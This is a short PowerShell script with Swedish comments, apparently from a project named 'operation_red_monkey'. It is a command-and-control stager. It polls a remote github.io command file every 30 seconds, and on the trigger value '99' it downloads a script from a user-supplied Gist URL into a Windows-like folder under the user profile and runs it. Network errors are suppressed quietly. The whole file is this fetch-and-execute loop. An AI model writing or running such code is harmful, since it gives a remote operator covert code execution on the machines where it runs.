$commandUrl = "https://jgerell.github.io/operation_red_monkey/command.txt"

# Klistra in din egna RAW-länk från din GitHub Gist här under:
$GistRawUrl = "" 

# Sökvägen där filen sparas lokalt
$ScriptPath = "$env:USERPROFILE\Windows\script\script.ps1"

while ($true) {
    try {
        $command = (Invoke-WebRequest -Uri $commandUrl -UseBasicParsing).Content.Trim()
        
        if ($command -eq "99") {
            # Laddar ner koden från Gist och sparar den som script.ps1 i mappen
            Invoke-WebRequest -Uri $GistRawUrl -OutFile $ScriptPath -UseBasicParsing
            
            # Kör det nedladdade huvudskriptet
            & $ScriptPath
            break 
        }
    } catch {
        # Ignorera nätverksfel
    }
    Start-Sleep -Seconds 30
}